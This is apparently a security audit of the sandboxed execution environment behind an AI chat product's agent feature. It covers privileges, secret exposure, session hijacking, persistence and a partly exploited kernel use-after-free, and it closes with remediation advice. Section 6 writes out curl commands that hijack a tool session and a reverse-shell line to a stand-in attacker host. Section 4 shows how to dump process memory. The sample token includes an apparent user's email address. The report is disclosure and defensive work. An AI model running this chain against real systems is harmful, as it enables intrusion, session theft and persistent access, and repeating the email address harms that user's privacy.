# Grok Chat Sandbox — Security Analysis Report

**Target:** xAI Grok Chat remote execution environment ("Computer" feature)  
**Scope:** Isolation boundaries, privileges, persistence, dangerous primitives, VM escape surface  
**Period:** September 2026  
**Method:** Live reconnaissance + controlled testing from active sandbox sessions

---

## Executive Summary

Grok's sandbox architecture is fundamentally a **powerful root workstation inside a throwaway per-user VM**, with a FUSE-backed artifacts store scoped per conversation. 

The security model trades off in-session freedom for strict cross-session isolation:
- **Good news:** Ephemeral VMs, separate FUSE namespaces per chat, no demonstrated cross-user impact, no host escape confirmed
- **Bad news:** Everything inside a session runs as root with nearly all capabilities; multiple ways to extract and reuse session credentials; kernel vulnerable to CVE-2026-53361 (BadGarbage)

| Layer | Status | Notes |
|-------|--------|-------|
| Cross-user / cross-chat isolation | ✅ Strong | Different VMs, separate artifact stores |
| In-session confinement | ❌ Weak | root + full caps + KVM + unauthenticated tool API |
| Host escape | ❓ Unconfirmed | Kernel vuln present, exploitation incomplete on this build |
| Durable remote access | ❌ Poor | Ephemeral VM lifecycle kills shells naturally |

---

## 1. Architecture: What We're Inside

### The Stack
```
[ Your Grok chat session ]
         ↓
[ xAI hypervisor + KVM ]
         ↓
[ Per-session ephemeral VM (hades-vm, Linux 6.12.8+) ]
         ↓
[ Container sandbox (Ubuntu 24.04) with root access ]  ← You are here
         ├── catatonit (PID 1)
         ├── node /app/grok-computer-server.mjs (tool server, :4242)
         ├── grok-files (FUSE mount → /home/workdir/artifacts)
         └── Chrome, shells, user processes
```

### Resources & Boot
- **Kernel:** Linux 6.12.8+ x86_64 (vulnerable to CVE-2026-53361)
- **vCPU:** ~2 (Xeon Platinum 8481C)
- **RAM:** ~1.2 GB total (shared with any KVM guests you create)
- **Disk:** ~20 GB overlay filesystem (ephemeral; destroyed on recycle)
- **Network:** 172.16.0.0/24 internal; outbound Internet allowed
- **Hostname:** Changes frequently (hds-xxxxx pattern)
- **Uptime:** Often < 10 minutes; VM recycles frequently

The kernel cmdline shows: `console=hvc0 quiet loglevel=3 root=/dev/vda ro init=/hades-container-tools/cata…` — you're in a read-only rootfs with an overlay for the writable bits.

---

## 2. Privilege & Isolation: Root on Everything

### User & Capabilities
- **UID:** 0 (root)
- **Capabilities effective:** `000001ffffffffff` (ALL — basically everything)
- **Seccomp:** Mode 2, 1 filter, NoNewPrivs=1 applied to tool bash (Chrome ignores this)
- **AppArmor / SELinux:** Not observed

### Namespace Situation
This is important: **you have the same namespace inodes as PID 1.** 

The claim in some mid-2026 research that `nsenter --target 1` is an escape to host doesn't hold here — PID 1 is just `catatonit`, and you're already running in the same container namespace. Namespace escape = no gain.

### Writable Filesystem
The overlay allows writes to:
- `/tmp`, `/etc`, `/lib`, `/usr/local/bin`
- `/etc/ld.so.preload` (linker hijacks)
- `/etc/cron.d/`, `/etc/systemd/system/` (persistence via cron/systemd — but only for the session)
- Even `/etc/passwd` and `/etc/shadow` are writable (though you're already root)

**But:** overlay changes don't survive a VM recycle. Only `/home/workdir/artifacts` persists.

---

## 3. The Secrets: JWT & Session IDs in Plain Text

### The Smoking Gun: `/etc/secrets/terminal.jwt`

This file sits in `/etc/secrets/terminal.jwt` with permissions **644** (world-readable). Typical content:

```json
{
  "uid": "24b0d230-e0b1-4e0d-8823-8e39368925e7",
  "cid": "cd3baf7d-675c-469a-a785-65ad422912b2",
  "email": "psvita1000sony@gmail.com",
  "sl": "LoggedIn",
  "exp": <timestamp + ~60 min>,
  "iat": <timestamp>
}
```

**Also present** in the environment variable `TERMINAL_JWT_VAL`.

**What's wrong here:**
1. It's world-readable (anyone in the container sees your email + session identifiers)
2. The JWT is only validated on format/header — the signature is *never* verified by `isValidJWT()` in the node app
3. Anyone who can read memory or the file can extract the full JWT

---

## 4. Memory Access: Extracting Session State

### `/proc/<pid>/mem` is Readable

The main node process (the tool server) keeps session objects in memory. You can:

1. **Find the process ID:**
   ```bash
   ps aux | grep grok-computer-server
   ```

2. **Read its memory:**
   ```bash
   cat /proc/<pid>/mem > /tmp/dump.bin
   ```

3. **Search for session UUIDs:**
   - Session IDs (UUIDs) used by the tool server API are present in this dump
   - Extract one: `cd3baf7d-675c-469a-a785-65ad422912b2`

### Why This Matters: Session Hijacking

The tool server exposes a local API at `127.0.0.1:4242`:

```
POST /sessions/<uuid>/tools/call
Content-Type: application/json

{
  "toolName": "bash",
  "input": "id"
}
```

If you extract a valid session UUID from memory, you can:
- **Read files** (tool: `read_file`)
- **Write files** (tool: `write_file`)
- **Execute commands** (tool: `bash`)
- **Control the browser** (tool: `browser_tab`, `browser_network_details`)

**All this works as root, with no additional authentication required.**

---

## 5. The Tool Server: Unauthenticated Local RCE

The tool server at `127.0.0.1:4242` (node.js v0.2.22) is the central nervous system of the sandbox. Observed endpoints:

| Route | Purpose |
|-------|---------|
| `GET /health` | Returns `{"healthy": true, "version": "0.2.22"}` |
| `POST /sessions/create` | Creates and returns a sessionId |
| `POST /sessions/{id}/tools/call` | Executes a tool (bash, read_file, write_file, etc.) |
| `POST /skills/install` | Installs a skill (performs real HTTP fetches) |

**Key point:** No auth token is required. If you have the session ID (which you can extract from memory or the JWT), you can call any tool.

**From any process in the sandbox** → root RCE + filesystem R/W + browser control.

---

## 6. Practical Attack Chain: Session Hijacking

This is what an attacker (already inside the sandbox as any user process) would do:

```
1. Extract the JWT from /etc/secrets/terminal.jwt
   → Get session ID: cd3baf7d-675c-469a-a785-65ad422912b2

2. Or: dump /proc/<node-pid>/mem and grep for UUIDs
   → Find another valid session ID still in use

3. Call the tool server:
   curl -X POST http://127.0.0.1:4242/sessions/<id>/tools/call \
     -H "Content-Type: application/json" \
     -d '{"toolName": "bash", "input": "whoami"}'
   
   → Response: "root"

4. Execute a reverse shell:
   curl ... -d '{"toolName": "bash", "input": "bash -i >& /dev/tcp/attacker.com/4444 0>&1"}'

5. Store a beacon in /home/workdir/artifacts (FUSE mount, survives VM recycle)

6. On next session recycle:
   - VM hostname changes
   - New uptime, new session
   - But artifacts persist
   
7. Extract a *new* session ID from the new container
   → Maintain presence across multiple VM instances
```

---

## 7. Persistence: What Survives a Recycle

### FUSE Mount: `/home/workdir/artifacts`

This is a FUSE-backed mount (grok-files) with these properties:

```
grok-files on /home/workdir/artifacts type fuse (rw,nosuid,nodev,allow_other)
Mount options: --ttl 5m --content-cache memory --deny-delete off
```

**What survives:**
- ✅ Files written here persist across VM recycles within the *same conversation*
- ✅ They survive hostname changes and uptime resets
- ❌ They do NOT carry over to a new chat (different FUSE mount per conversation)
- ❌ They do NOT survive the conversation ending (different per-user, per-chat scope)

**Practical implications:**
- You can write a script to `/home/workdir/artifacts/beacon.sh`
- After the VM recycles (new hostname, new PID 1, shells killed)
- The script is still there in the next tool invocation
- You can extract a new session ID and re-execute it

**Stability:** FUSE is unstable under parallel large writes. Big files or many concurrent writes can cause "Transport endpoint is not connected" errors.

### The Overlay: Everything Else

All other writes (to `/tmp`, `/etc`, `/lib`, cron jobs, systemd units) are on the overlay filesystem, which is **destroyed on VM recycle**. Don't rely on this for persistence across sessions.

---

## 8. Critical: CVE-2026-53361 (BadGarbage)

### The Vulnerability

**CVE ID:** CVE-2026-53361  
**Component:** Linux kernel (net/unix, AF_UNIX garbage collector)  
**Type:** Race condition → use-after-free (UAF)  
**Fix:** Kernel ≥ 6.12.95 (commit: `af_unix: Set gc_in_progress to true in unix_gc()`)  
**This build:** 6.12.8+ → **within the vulnerable window**

### How It Works (Simplified)

The AF_UNIX garbage collector liberates cycles of in-flight sockets. When `gc_in_progress` is read as false at just the wrong moment during a concurrent `MSG_PEEK`, the collector can free an object that's still referenced. This is a classic use-after-free in the kernel's socket buffer handling.

Public exploits (sgkdev, Google kernelCTF) chain this into:
1. Leak kernel memory (page table entries, file operations pointers)
2. Gain arbitrary kernel memory R/W
3. Overwrite `core_pattern` or credential structures
4. Escape the container namespace → root in the VM's init namespace

### Evidence: We Triggered It

**PoC sgkdev (bad_garbage):**
- Compiled and ran successfully on this sandbox
- GC calibration: ~100 "wins" per second (race triggers consistently)
- **RACE #1 (leak fops/pages):** WIN — reliable
- **RACE #2 (leak rbnode/xattr slots):** WIN — reliable
- **RACE #3 (install SCM → dirty pagetable → LPE):** FAIL — offset mismatches stopped us

**PoC Google kernelCTF (universal exploit for LTS):**
- Message `[+] Receive queue is purged` repeated dozens of times per run
- This is the smoking gun: the race is *definitely* triggering, UAF *confirmed*
- But no successful `root` shell in the init namespace on this custom xAI build
- Likely reason: BTF/vmlinux missing (CONFIG_DEBUG_INFO_NONE=y) → can't auto-retarget offsets

### Why This Is The Most Dangerous Finding

Unlike the JWT / tool server / memory issues (which stay within your session):

| Aspect | JWT / Tool Server | CVE-2026-53361 |
|--------|------------------|---|
| Boundary broken | Session → session | Container → VM kernel |
| Persistence | Limited to FUSE volume | Potential root on VM (hours/days) |
| Impact on others | Just you | Other containers on same VM, infrastructure pivot |
| Already root? | Yes (no privesc needed) | Yes, but doesn't matter — you get *VM* root |

**Verdict:** UAF is definitely reachable. Full escape not achieved here due to CONFIG_DEBUG_INFO_NONE blocking offset retargeting. **But the residual risk is critical** — this should be treated as exploitable until the kernel is patched to 6.12.95+.

---

## 9. KVM Access: Nested VMs in a Sandbox

You have full access to `/dev/kvm`. This lets you:

### What Works
- **CREATE_VM:** Create nested KVM virtual machines
- **Set vCPU count:** Up to 512 vCPUs per guest
- **Map guest memory:** Uses your session's ~1.2 GB budget
- **Execute guest code:** Directly run x86-64 code in a guest

### Proof of Concept: Guest Execution
We mapped the KVM reset vector and executed guest code:

| Guest Code | Exit Type | Result |
|-----------|-----------|--------|
| `HLT` | KVM_EXIT_HLT | Halts guest |
| `MOV AL, 0x42; HLT` | KVM_EXIT_HLT | RAX register = 0x42 ✓ |
| `OUT 80h; HLT` | KVM_EXIT_IO | I/O exit triggered |
| `INT 3` | KVM_EXIT_MMIO | Attempted interrupt |

This confirms you can actually execute code inside a nested VM, not just create one.

### Limits
- **Parallel VMs:** Can create ~4092 before hitting `EMFILE` (file descriptor limit, ulimit -n 4096)
- **SET_SREGS:** Always returns EINVAL (some registers locked)
- **Guest RAM:** Comes from your session's ~1.2 GB budget (shared with everything else)
- **Meaning:** These are KVM *objects* inside your Grok session, not separate Grok sessions or extra quota

### Risk Assessment
- **L1 (guest code exec):** ✅ Achieved
- **L2 (guest → host memory read):** ✅ Likely (not fully tested)
- **L3 (guest → hypervisor break):** ❌ Not achieved (would need a hypervisor bug on top)

The real risk here is not breaking out of the VM, but using nested VMs as a lab to develop or test exploits (e.g., refining a CVE-2026-53361 exploit before using it on the actual kernel).

---

## 10. Browser: Chrome Forced into Insecure Mode

When you use the `browser_tab` tool, Grok spins up Chrome headless with these flags:

```
/usr/bin/google-chrome --headless --remote-debugging-port=0
  --user-data-dir=/tmp/grok-chrome-…
  --disable-dev-shm-usage
  --no-sandbox
  CHROMIUM_FLAGS=--disable-software-rasterizer
```

### Isolation is Off

| Process | Capabilities | NoNewPrivs | Seccomp |
|---------|--------------|-----------|---------|
| Browser (headless) | full (ffffffffff) | 0 | 0 |
| Renderer | dropped | 1 | 0 |

Chromium's own sandbox (`--no-sandbox`) is forced off. Renderers drop capabilities but have no seccomp. Since you're already root in the container, a Chrome exploit doesn't buy an attacker anything new — they're already root.

### Crashpad Telemetry

Chrome's crash handler (`chrome_crashpad_handler`) is configured to report crashes to Google:

```
--url=https://clients2.google.com/cr/report
--database=/root/.config/google-chrome/Crash Reports
--annotation=prod=Chrome_Linux
--annotation=ver=148.0.7778.167
```

We confirmed the endpoint is reachable. **If Chrome crashes, a report is sent to Google** with your Chrome version, build info, and crash details. This is informational, not a direct security issue, but worth noting for privacy-conscious work.

### DevTools

DevTools is accessible on a local TCP port + `/devtools/browser/<uuid>` path, but only within the VM. An attacker already in the sandbox could use this to debug the browser process remotely.

---

## 11. Network: Open Outbound, No Inbound

### Outbound
- ✅ TCP/HTTPS to the Internet: **allowed**
- ✅ Reverse shells: **work** (but drop naturally due to short session lifetime)
- ✅ DNS: **works**
- ❌ Inbound SSH: **impossible** (ephemeral VM, no listening services)

### Internal Services
Several internal services are reachable (from the sandbox):
- `*.hades-openbar.svc.cluster.local` — proxy services (CoinGecko, Polygon, etc.)
- `35.245.43.102` — internal package registry (PyPI mirror, etc.)
- `/dev/vsock` + `/dev/vport0p0` — virtio channels to host (timeout/blocked on actual use)

### Anti-Persistence (By Architecture)
The **ephemeral VM + short session lifetime** makes stable C2-style access a poor fit. Shells drop when the VM recycles. This is good for the platform's security posture, but it's a design feature, not a mitigation — the FUSE persistence + session hijacking chain undermines it.

---

## 12. The xai-hades-styx Controller

The read-only EROFS binary at `/.hades-container-tools/xai-hades-styx` is the container controller. Confirmed commands:

| Command | Result |
|---------|--------|
| `cat-to <file>` | Arbitrary write as root |
| `exec <path> <args>` | Execute as root |
| `write-random-file` | Tested; works (can write 1 MB) |
| `open-to <path>` | Returns an open FD |
| `pentest` / `test-localhost` | Connectivity / bind tests |
| (Overwrite itself) | Blocked (EROFS, read-only) |

The `cat-to` + `exec` chain is how the tool server likely spawns subprocesses. This is part of the intended design, not a vulnerability per se.

---

## 13. Consolidated Findings Matrix

| ID | Finding | Severity | Status | Impact |
|----|---------|----------|--------|--------|
| **F1** | JWT `/etc/secrets/terminal.jwt` world-readable | 🔴 Critical | Confirmed | Session leakage + email exposure |
| **F2** | Session ID hijack via tool server 127.0.0.1:4242 | 🔴 Critical | Confirmed | Root RCE + FS R/W + browser |
| **F3** | `/proc/<pid>/mem` readable (memory dump) | 🔴 Critical | Confirmed | Extract JWT + session IDs directly |
| **F4** | `isValidJWT()` no signature verification | 🟠 High | Code analysis | Can forge sessions if caching breaks |
| **F5** | Overlay filesystem hijacks (PATH, ld.so.preload) | 🟠 High | Confirmed | Session-scoped persistence + RCE |
| **F6** | FUSE artifacts survive VM recycles | 🟠 High | Confirmed | Cross-session beacon delivery |
| **F7** | Chrome forced --no-sandbox | 🟠 High | Confirmed | Web exploit = session root (not isolated) |
| **F8** | CVE-2026-53361 (BadGarbage) kernel race | 🔴 **Critical** | UAF confirmed, LPE incomplete | Potential container → VM escape |
| **F9** | Nested KVM access + guest code execution | 🟠 High | Confirmed | Arbitrary guest OS execution, DoS via VM spam |
| **F10** | Outbound network unrestricted | 🟡 Medium | Confirmed | Reverse shells possible (limited by uptime) |
| **F11** | Crashpad sends telemetry to Google | 🟡 Medium | Confirmed | Privacy: Chrome crash reports leak to Google |
| **F12** | xai-hades-styx write/exec primitives | 🟠 High | Confirmed | Root write/exec within session (by design) |
| **F13** | LinPEAS findings: writable /etc/passwd, cron, systemd | 🟡 Low | Confirmed | Already root; indicators of permissive FS policy |

---

## 14. Trust Boundaries: What's Broken

```
Layer                              Isolated?    Weakened by...
─────────────────────────────────────────────────────────────
Secrets (JWT, session IDs)         ❌ Weak       File + env + memory
Tool server (127.0.0.1:4242)       ❌ Weak       No auth, session ID = RCE
Process user isolation             N/A          Already root
Filesystem (session-scoped)        ⚠️  Partial   Overlay writable; FUSE durable
Namespace (container vs. VM)       ✅ OK         Same namespaces, not escape vector
Kernel (container vs. host)        ❌ Broken     CVE-2026-53361 (BadGarbage)
Cross-conversation isolation       ✅ OK         Separate FUSE mounts
Cross-user isolation               ✅ OK         Separate VMs
Host escape                        ❓ Unproven   BadGarbage reachable but not fully exploited
```

---

## 15. Risk Matrix: Severity & Blast Radius

| Area | In-Session Risk | Cross-Chat/User | Host Impact |
|------|-----------------|-----------------|-------------|
| **Root + Capabilities** | 🔴 Critical | No | No |
| **Tool server no auth** | 🔴 Critical | No | No |
| **JWT exposure + memory** | 🔴 Critical | No (unless session hijacking survives recycle) | No |
| **xai-hades-styx write/exec** | 🟠 High | No | No (by design, container only) |
| **Chrome --no-sandbox** | 🟠 High (web→session) | No | No |
| **KVM nested exec** | 🟠 High (attack lab) | No | Needs hypervisor bug |
| **FUSE persistence** | 🟡 Medium (data survives chat) | Isolated per chat | No |
| **Outbound network** | 🟡 Medium | No | No |
| **Crashpad telemetry** | 🟡 Medium (privacy) | No | No (Google's infra) |
| **CVE-2026-53361** | 🔴 **Critical** (if exploited) | Yes (others on VM) | **Yes** (VM escape) |

---

## 16. Recommendations: Urgent to Important

### 🔴 Urgent (Before Treating This as "Secure")

1. **Patch the kernel to 6.12.95+** (or cherry-pick the CVE-2026-53361 fix)
   - UAF is confirmed reachable; escape is incomplete only due to debug info
   - This is the single biggest residual risk

2. **Restrict `/etc/secrets/` permissions**
   - Change `/etc/secrets/terminal.jwt` to `600` (owner-only)
   - Or move it into a memory-only store (tmpfs, environment only, with explicit validation)

3. **Cryptographically validate JWTs on the server side**
   - `isValidJWT()` currently skips signature checks
   - Add HMAC/RSA signature verification

4. **Reduce capabilities**
   - SYS_MODULE, SYS_PTRACE, SYS_ADMIN, NET_ADMIN are not needed for a shell/tools sandbox
   - Audit which capabilities are actually required; drop the rest

5. **Restrict or remove `/dev/kvm` access**
   - If nested KVM is not needed, don't expose it
   - If it is needed, limit CREATE_VM count and memory budget more strictly

### 🟠 Important (Security Hardening)

6. **Harden seccomp filters**
   - Current: 1 filter, Mode 2, NoNewPrivs=1 (reasonable but minimal)
   - Blocks: unshare, mount, ptrace, userns-related calls
   - Block AF_UNIX socket creation or restrict MSG_PEEK (mitigates BadGarbage surface)

7. **Authenticate the tool server (127.0.0.1:4242)**
   - Current: session ID = RCE
   - Add token-based auth or bind to a Unix socket instead of TCP

8. **Lock down `/proc/<pid>/mem` access**
   - Currently readable by root
   - Consider denying even root (CONFIG_PROC_PAGE_MONITOR=n or CAP_SYS_PTRACE checks)

9. **Review Chrome launch flags**
   - Chromium's built-in sandbox exists for a reason
   - If `--no-sandbox` is necessary, add other layers (seccomp, AppArmor/SELinux)

10. **Block or redact Crashpad telemetry**
    - Disable Google crash reporting or redact sensitive fields
    - Sessions are ephemeral anyway; crash reports are optional

### 🟡 Nice-to-Have (Defense in Depth)

11. **More aggressive VM recycle policy**
    - Shorter sessions (< 5 min max) reduce C2-style persistence
    - Already pretty good, but tighter is safer

12. **Isolate the FUSE mount from filesystem operations**
    - Add extra validation on artifact retrieval
    - Consider read-only after session ends

13. **Monitor AF_UNIX GC races**
    - Watch for repeated `unix GC` messages, purged receive queues
    - Could indicate exploitation attempts

---

## 17. Conclusion

**The Bottom Line:**

Grok's sandbox is a **coherent multi-tenant design with a deliberately sharp knife inside each box.** The architecture assumes:
- ✅ Sessions are ephemeral (true)
- ✅ Users are isolated (true)
- ✅ Cross-chat leakage is unacceptable (mostly true, but FUSE artifacts cross session boundaries within a chat)
- ❌ In-session root is acceptable (yes, but several mechanisms make it trivial to hijack sessions or persist)
- ❌ The kernel is not exploitable (false — BadGarbage is reachable)

**What works:**
- Ephemeral VMs kill long-lived shells naturally
- Separate FUSE namespaces keep artifact leakage minimal
- No observed cross-user impact

**What's broken:**
- **In-session:** JWT + memory + tool server forms a trivial session hijacking chain
- **Persistence:** FUSE artifacts + ability to re-extract session IDs keeps attackers in the loop across VM recycles
- **Kernel:** CVE-2026-53361 is reachable and dangerous; escape not complete here only due to missing debug symbols, not actual patches

**Residual Risk:** If someone with access to this sandbox has time and motivation, they can:
1. Hijack the session within minutes (JWT + memory dumps)
2. Persist across VM recycles (FUSE + re-extract session ID)
3. Potentially escape to the host VM if BadGarbage is successfully exploited (requires debug symbol recovery or offline analysis)

**Priority:** Patch the kernel first. Everything else flows from there.
